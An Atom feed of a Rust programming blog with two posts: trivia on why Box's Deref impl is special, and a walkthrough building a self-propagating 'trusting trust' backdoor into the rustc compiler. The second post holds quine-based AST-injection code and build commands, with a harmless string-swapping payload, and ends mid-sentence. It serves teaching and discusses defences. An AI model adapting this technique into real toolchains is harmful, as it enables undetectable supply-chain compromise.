<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Programming | In Pursuit of Laziness]]></title>
  <link href="http://manishearth.github.io/blog/categories/programming/atom.xml" rel="self"/>
  <link href="http://manishearth.github.io/"/>
  <updated>2017-01-11T01:14:16-08:00</updated>
  <id>http://manishearth.github.io/</id>
  <author>
    <name><![CDATA[Manish Goregaokar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: Box Is Special]]></title>
    <link href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"/>
    <updated>2017-01-10T22:59:43-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special</id>
    <content type="html"><![CDATA[<p>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</p>

<hr />

<p>So. <code>Box&lt;T&gt;</code>. Your favorite heap allocation type that nobody uses<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p>I was discussing some stuff on the rfcs repo when
<a href="https://github.com/rust-lang/rfcs/issues/1850#issuecomment-271766300">@burdges realized that <code>Box&lt;T&gt;</code> has a funky <code>Deref</code> impl</a>.</p>

<p>Let&rsquo;s <a href="https://github.com/rust-lang/rust/blob/e4fee525e04838dabc82beed5ae1a06051be53fd/src/liballoc/boxed.rs#L502">look at it</a>:</p>

<pre><code class="rust">#[stable(feature = "rust1", since = "1.0.0")]
impl&lt;T: ?Sized&gt; Deref for Box&lt;T&gt; {
    type Target = T;

    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
}

#[stable(feature = "rust1", since = "1.0.0")]
impl&lt;T: ?Sized&gt; DerefMut for Box&lt;T&gt; {
    fn deref_mut(&amp;mut self) -&gt; &amp;mut T {
        &amp;mut **self
    }
}
</code></pre>

<p>Wait, what? <em>Squints</em></p>

<pre><code class="rust">    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
</code></pre>

<p><em>The call is coming from inside the house!</em></p>

<p>In case you didn&rsquo;t realize it, this deref impl returns <code>&amp;**self</code> &ndash; since <code>self</code>
is an <code>&amp;Box&lt;T&gt;</code>, dereferencing it once will provide a <code>Box&lt;T&gt;</code>, and the second dereference
will dereference the box to provide a <code>T</code>. We then wrap it in a reference and return it.</p>

<p>But wait, we are <em>defining</em> how a <code>Box&lt;T&gt;</code> is to be dereferenced (that&rsquo;s what <code>Deref::deref</code> is
for!), such a definition cannot itself dereference a <code>Box&lt;T&gt;</code>! That&rsquo;s infinite recursion.</p>

<p>And indeed. For any other type such a <code>deref</code> impl would recurse infinitely. If you run
<a href="https://play.rust-lang.org/?gist=9c8a02336c6816e57c83de39c103ca06&amp;version=stable&amp;backtrace=0">this code</a>:</p>

<pre><code class="rust">use std::ops::Deref;

struct LolBox&lt;T&gt;(T);

impl&lt;T&gt; Deref for LolBox&lt;T&gt; {
    type Target = T;
    fn deref(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
}
</code></pre>

<p>the compiler will warn you:</p>

<pre><code class="text">warning: function cannot return without recurring, #[warn(unconditional_recursion)] on by default
 --&gt; &lt;anon&gt;:7:5
  |
7 |     fn deref(&amp;self) -&gt; &amp;T {
  |     ^
  |
note: recursive call site
 --&gt; &lt;anon&gt;:8:10
  |
8 |         &amp;**self
  |          ^^^^^^
  = help: a `loop` may express intention better if this is on purpose
</code></pre>

<p>Actually trying to dereference the type will lead to a stack overflow.</p>

<p>Clearly something is fishy here. Turns out, <code>Box&lt;T&gt;</code> is special.</p>

<p>This is partly due to historical accident.</p>

<p>To understand this, we must look back to Ye Olde days of pre-1.0 Rust (ca 2014). Back in these days,
we had none of this newfangled &ldquo;stability&rdquo; business. The compiler broke your code every two weeks.
Of course, you wouldn&rsquo;t <em>know</em> that because the compiler would usually crash before it could tell
you that your code was broken! Sigils roamed the lands freely, and cargo was but a newborn child
which was destined to eventually end the tyranny of Makefiles. People were largely happy knowing
that their closures were safely boxed and their threads sufficiently green.</p>

<p>Back in these days, we didn&rsquo;t have <code>Box&lt;T&gt;</code>, <code>Vec&lt;T&gt;</code>, or <code>String</code>. We had <code>~T</code>, <code>~[T]</code>, and <code>~str</code>.
The second two are <em>not</em> equivalent to <code>Box&lt;[T]&gt;</code> and <code>Box&lt;str&gt;</code>, even though they may look like it,
they are both growable containers like <code>Vec&lt;T&gt;</code> and <code>String</code>. <code>~</code> conceptually meant &ldquo;owned&rdquo;, though
IMO that caused more confusion than it was worth.</p>

<p>You created a box using the <code>~</code> operator, e.g. <code>let x = ~1;</code>. It could be dereferenced with the <code>*</code>
operator, and autoderef worked much like it does today.</p>

<p>As a &ldquo;primitive&rdquo; type; like all primitive types, <code>~T</code> was special. The compiler knew things about
it. The compiler knew how to dereference it without an explicit <code>Deref</code> impl. In fact, the <code>Deref</code>
traits <a href="https://github.com/rust-lang/rust/pull/12491">came into existence</a> much after <code>~T</code> did. <code>~T</code> never got an explicit <code>Deref</code> impl,
though it probably should have. This whole situation is reminiscent of how the <code>Add</code> impls on
integers work, the impl literally <a href="https://github.com/rust-lang/rust/blob/e57f061be20666eb0506f6f41551c798bbb38b60/src/libcore/ops.rs#L255">defines <code>Add</code> on two integers to be their addition</a>.
The reason these impls need to exist is so that people can still call <code>Add::add</code> if they need to
in generic code and be able to pass integers to things with an <code>Add</code> bound.</p>

<p>Eventually, there was a move to remove sigils from the language. The box constructor <code>~foo</code> was
superseded by <a href="https://github.com/rust-lang/rust/pull/11055/">placement <code>box</code> syntax</a>, which still exists in Rust nightly<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Then, the
<a href="https://github.com/rust-lang/rust/pull/13904"><code>~T</code> type became <code>Box&lt;T&gt;</code></a>. (<code>~[T]</code> and <code>~str</code> would also be removed, though <code>~str</code> took
a very confusing detour with <code>StrBuf</code> first).</p>

<p>However, <code>Box&lt;T&gt;</code> was still special. It no longer needed special syntax to be referred to or
constructed, but it was still internally a special type. It didn&rsquo;t even have a <code>Deref</code> impl yet,
that came <a href="https://github.com/rust-lang/rust/pull/20052">six months later</a>, and it was implemented as <code>&amp;**self</code>, exactly the same
as it is today.</p>

<p>But why does it <em>have</em> to be special now? Rust had all the features it needed (allocations,
ownership, overloadable deref) to implement <code>Box&lt;T&gt;</code> in pure rust in the stdlib as if it
were a regular type.</p>

<p>Turns out that Rust didn&rsquo;t. You see, because <code>Box&lt;T&gt;</code> and before it <code>~T</code> were special, their
dereference semantics were implemented in a different part of the code. And, these semantics were
not the same as the ones for <code>DerefImm</code> and <code>DerefMut</code>, which were created for use with other smart
pointers. I don&rsquo;t know if the possibility of being used for <code>~T</code> was considered when
<code>DerefImm</code>/<code>DerefMut</code> were being implemented, or if it was a simple oversight, but <code>Box&lt;T&gt;</code> has
three pieces of behavior that could not be replicated in pure Rust at the time:</p>

<ul>
<li><code>box foo</code> in a pattern would destructure a box into its contents. It&rsquo;s somewhat the opposite of <code>ref</code></li>
<li><code>box foo()</code> performed placement box, so the result of <code>foo()</code> could be directly written to a preallocated box, reducing extraneous copies</li>
<li>You could <em>move out of deref</em> with <code>Box&lt;T&gt;</code></li>
</ul>


<p>The third one is the one that really gets to us here<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.
For a <em>regular</em> type, <code>*foo</code> will produce a temporary that must be immediately borrowed or copied.
You cannot do <code>let x = *y</code> for a non-<code>Copy</code> type. This dereference operation will call
<code>DerefMut::deref_mut</code> or <code>Deref::deref</code> based on how it gets borrowed. With <code>Box&lt;T&gt;</code>, you can do
this:</p>

<pre><code class="rust">let x = Box::new(vec![1,2,3,4]);
let y = *x; // moves the vec out into `y`, then deallocates the box
            // but does not call a destructor on the vec
</code></pre>

<p>For any other type, such an operation will produce a &ldquo;cannot move out of a borrow&rdquo; error.</p>

<p>This operation is colloquially called <code>DerefMove</code>, and there has been <a href="https://github.com/rust-lang/rfcs/pull/178/files?short_path=6f69a99#diff-6f69a990502a98c2eeb172d87269005d">an rfc</a> in the
past for making it into a trait. I suspect that the <code>DerefMove</code> semantics could even have been
removed from <code>Box&lt;T&gt;</code> before 1.0 (I don&rsquo;t find it <em>necessary</em>), but people had better things to do,
like fixing the million other rough edges of the language that can&rsquo;t be touched after backwards
compatibility is a thing.</p>

<p>So now we&rsquo;re stuck with it. The current status is that <code>Box&lt;T&gt;</code> is <em>still</em> a special type in the
compiler. By &ldquo;special type&rdquo; I don&rsquo;t just mean that the compiler treats it a bit differently (this is
true for any lang item), I mean that it literally is treated as
<a href="http://manishearth.github.io/rust-internals-docs/rustc/ty/enum.TypeVariants.html#TyBox.v">a completely new kind of type</a>, not as a struct the way it has been defined in liballoc.
There&rsquo;s a TON of cruft in the compiler related to this type, much of which can be removed, but some
of which can&rsquo;t. If we ever do get <code>DerefMove</code>, we should probably try removing it all again. After
writing this post I&rsquo;m half-convinced to try and implement an internal-use-only <code>DerefMove</code> and try
cleaning up the code myself.</p>

<p>Most of this isn&rsquo;t really useful to know unless you actually come across a case where you can make
use of <code>DerefMove</code> semantics, or if you work on the compiler. But it certainly is interesting!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Seriously though, does anyone use it much? I&rsquo;ve only seen it getting used for boxed DSTs (trait objects and boxed slices), which themselves are pretty rare, for sending heap types over FFI, and random special cases. I find this pretty interesting given that other languages are much more liberal with non-refcounted single-element allocation.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>It will probably eventually be replaced or made equivalent to the <code>&lt;-</code> syntax before stabilizing<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>It&rsquo;s easier to special case the first two, much like how <code>for</code> loops are aware of the iterator trait without the iterator trait being extremely special cased<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
    <link href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/"/>
    <updated>2016-12-02T11:28:27-08:00</updated>
    <id>http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust</id>
    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
development. This usually means that the process of building the compiler involves downloading a
(typically) older version of the compiler.</p>

<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
started my interest in compilers, and I hope this post can help get others interested the same way.</p>

<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>

<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>

<h2>The attack</h2>

<p>The essence of the attack is this:</p>

<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
backdoor that lets it unconditionally accept a special password (created by the attacker) for any
user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
by their modified compiler.</p>

<p>However, this change would be detected in the source. If it was not included in the source, this
change would disappear in the next release of the compiler, or when someone else compiles the
compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
equally applies here.</p>

<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
modify the compiler with a backdoor which detects when it is compiling the same compiler, and
introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>

<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
starts getting distributed, it will spread itself as it is used to compile more copies of itself
(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
need to be modified for it to work; just the non-human-readable binary.</p>

<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
existed, that compiler had to be written in some other language Y. If you can track the sources back
to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
two different compilers and stay put throughout the history of X, you can of course trace back Y
back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<h2>Backdooring Rust</h2>

<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
don&rsquo;t actually want to backdoor the compiler.</p>

<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>

<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
with &ldquo;जगाला नमस्कार&rdquo;, a rough translation of the same in my native language.</p>

<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>

<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
each kind of node, you get to specify a function which will produce a node to be used in its place.
Most such functions will default to no-op (returning the same node).</p>

<p>So I write the following <code>Folder</code>:</p>

<pre><code class="rust">// Understanding the minute details of this code isn't important; it is a bit complex
// since the API used here isn't meant to be used this way. Focus on the comments.

mod trust {
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    struct TrustFolder;

    // The trait contains default impls which we override for specific cases
    impl Folder for TrustFolder {
        // every time we come across an expression, run this function
        // on it and replace it with the produced expression in the tree
        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
            // The peculiar `.map` pattern needs to be used here
            // because of the way AST nodes are stored in immutable
            // `P&lt;T&gt;` pointers. The AST is not typically mutated.
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) =&gt; {
                        *l = l.clone().map(|mut l| {
                            // look for string literals
                            if let LitKind::Str(ref mut s, _) = l.node {
                                // replace their contents
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ =&gt; ()
                }
                // recurse down expression with the default fold
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mac(&amp;mut self, mac: Mac) -&gt; Mac {
            // Folders are not typically supposed to operate on pre-macro-expansion ASTs
            // and will by default panic here. We must explicitly specify otherwise.
            noop_fold_mac(mac, self)
        }
    }

    // our entry point
    pub fn fold_crate(krate: Crate) -&gt; Crate {
        // make a folder, fold the crate with it
        TrustFolder.fold_crate(krate)
    }
}
</code></pre>

<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>

<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>

<pre><code class="rust">// test.rs
fn main() {
    let x = "hello world";
    println!("{}", x);
}
</code></pre>

<pre><code class="sh">$ rustup run stage1 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.</p>

<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
<code>trust::fold_crate()</code> call).</p>

<p>We need to tweak our folder so that it does two things:</p>

<ul>
<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
<li>Inserts the <code>trust</code> module</li>
</ul>


<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
are within the same module, so the instructions for outputting <em>these</em> instructions need to be
included, and so on. This clearly isn&rsquo;t viable.</p>

<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like</p>

<pre><code class="rust">mod trust {
    static SELF_STRING: &amp;'static str = "/* stringified contents of this module except for this line */";
    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
</code></pre>

<p>With the code of the module entered in, this will look something like</p>

<pre><code class="rust">mod trust {
    static SELF_STRING: &amp;'static str = "
        // .. 
        fn fold_mod(..) {
            // ..
            // this produces a string that is the same as the code for the module containing it
            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
            // once to produce the code for the module
            let code_for_module = \"mod trust { static SELF_STRING: &amp;'static str = \\\"\" + SELF_STRING + \"\\\";\" + SELF_STRING + \"}\";
            insert_into_crate(code_for_module);
            // ..
        }
        // ..
    ";

    // ..
    fn fold_mod(..) {
        // ..
        // this produces a string that is the same as the code for the module containing it
        // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and
        // once to produce the code for the module
        let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
        insert_into_crate(code_for_module);
        // ..
    }
    // ..
}
</code></pre>

<p>So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice &ndash; once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
the original AST!</p>

<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
works, without worrying about this cyclical quineyness:</p>

<pre><code class="rust">mod trust {
    // dummy string just to see if it gets injected
    // inserting the full code of this module has some practical concerns
    // about escaping which I'll address later
    static SELF_STRING: &amp;'static str = "use foo::bar::blah;";
    use syntax::fold::*;
    use syntax::ast::*;
    use syntax::parse::parse_crate_from_source_str;
    use syntax::parse::token::InternedString;
    use syntax::ptr::P;
    use syntax::util::move_map::MoveMap;
    use rustc::session::Session;

    struct TrustFolder&lt;'a&gt; {
        // we need the session to be able to parse things. No biggie.
        sess: &amp;'a Session,
    }

    impl&lt;'a&gt; Folder for TrustFolder&lt;'a&gt; {
        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
            expr.map(|mut expr| {
                match expr.node {
                    ExprKind::Lit(ref mut l) =&gt; {
                        *l = l.clone().map(|mut l| {
                            if let LitKind::Str(ref mut s, _) = l.node {
                                if s == "hello world" {
                                    *s = InternedString::new("जगाला नमस्कार");
                                }
                            }
                            l
                        })
                    }
                    _ =&gt; ()
                }
                noop_fold_expr(expr, self)
            })
        }
        fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
            // move_flat_map takes a vector, constructs a new one by operating
            // on each element by-move. Again, needed because of `P&lt;T&gt;`
            let new_items = m.items.move_flat_map(|item| {
                // we want to modify this function, and give it a sibling from SELF_STRING
                if item.ident.name.as_str() == "phase_2_configure_and_expand" {
                    // parse SELF_STRING
                    let new_crate = parse_crate_from_source_str("trust".into(),
                                                                SELF_STRING.into(),
                                                                &amp;self.sess.parse_sess).unwrap();
                    // extract the first item contained in it, which is the use statement
                    let inner_item = new_crate.module.items[0].clone();

                    // move_flat_map needs an iterator of items to insert
                    vec![inner_item, item].into_iter()
                } else {
                    vec![item].into_iter()
                }
            });
            let m = Mod {
                inner: m.inner,
                items: new_items,
            };
            noop_fold_mod(m, self)
        }
        fn fold_mac(&amp;mut self, _mac: Mac) -&gt; Mac {
            noop_fold_mac(_mac, self)
        }
    }

    pub fn fold_crate(krate: Crate, sess: &amp;Session) -&gt; Crate {
        let mut folder = TrustFolder {sess: sess};
        folder.fold_crate(krate)
    }
}
</code></pre>

<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>

<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>

<pre><code>rustc: x86_64-apple-darwin/stage1/lib/rustlib/x86_64-apple-darwin/lib/librustc_driver
error[E0432]: unresolved import `foo::bar::blah`
 --&gt; trust:1:5
  |
1 | use foo::bar::blah;
  |     ^^^^^^^^^^^^^^ Maybe a missing `extern crate foo;`?

error: aborting due to previous error
</code></pre>

<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
resolve, and thus got a failure when compiling the crate the second time around.</p>

<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>

<pre><code class="rust">fn fold_mod(&amp;mut self, m: Mod) -&gt; Mod {
    let new_items = m.items.move_flat_map(|item| {
        // look for the phase_2_configure_and_expand function
        if item.ident.name.as_str() == "phase_2_configure_and_expand" {
            // construct the code for the module contents as described earlier
            let code_for_module = r###"mod trust { static SELF_STRING: &amp;'static str = r##"###.to_string() + r###"##""### + SELF_STRING + r###""##"### + r###"##;"### + SELF_STRING + "}";
            // Parse it into an AST by creating a crate only containing that code
            let new_crate = parse_crate_from_source_str("trust".into(),
                                                        code_for_module,
                                                        &amp;self.sess.parse_sess).unwrap();
            // extract the AST of the contained module
            let inner_mod = new_crate.module.items[0].clone();

            // now to insert the fold_crate() call
            let item = item.map(|mut i| {
                if let ItemKind::Fn(.., ref mut block) = i.node {
                    *block = block.clone().map(|mut b| {
                        // create a temporary crate just containing a fold_crate call
                        let new_crate = parse_crate_from_source_str("trust".into(),
                                                                    "fn trust() {let krate = trust::fold_crate(krate, sess);}".into(),
                                                                    &amp;self.sess.parse_sess).unwrap();
                        // extract the AST from the parsed temporary crate, shove it in here
                        if let ItemKind::Fn(.., ref blk) = new_crate.module.items[0].node {
                            b.stmts.insert(0, blk.stmts[0].clone());
                        }
                        b
                    });
                }
                i
            });
            // yield both the created module and the modified function to move_flat_map
            vec![inner_mod, item].into_iter()
        } else {
            vec![item].into_iter()
        }
    });
    let m = Mod {
        inner: m.inner,
        items: new_items,
    };
    noop_fold_mod(m, self)
}
</code></pre>

<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.</p>

<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>

<pre><code class="rust">let code_for_module = "mod trust { static SELF_STRING: &amp;'static str = \"" + SELF_STRING + "\";" + SELF_STRING + "}";
</code></pre>

<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.</p>

<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>

<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we&rsquo;re done.</p>

<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>

<pre><code class="sh">$ rustup run stage2 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>I was also able to make it work with a separate clone of Rust:</p>

<pre><code class="sh">$ cd /path/to/new/clone
# Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked
# from anywhere inside this folder.
$ rustup override set stage1 # Works with stage 2 as well.

# with --enable-local-rust, instead of the downloaded stage 0 compiler compiling
# stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we
# need to check out a git commit close to our changes. This commit is the parent of our changes,
# and is bound to work
$ git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1

# This will make it call `rustc` instead of downloading its own compiler.
# We already overrode rustc to be our backdoored compiler for this folder
# using rustup
$ ./configure --enable-local-rust
# build it!
$ make rustc-stage1
# Tell rustup about the new toolchain
$ rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
$ rustup run other-stage1 rustc test.rs
$ ./test
जगाला नमस्कार
</code></pre>

<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>

<hr />

<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>

<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>

<p>A couple of things we could do are:</p>

<ul>
<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">&ldquo;Diverse Double-Compiling&rdquo;</a> wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
</ul>


<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
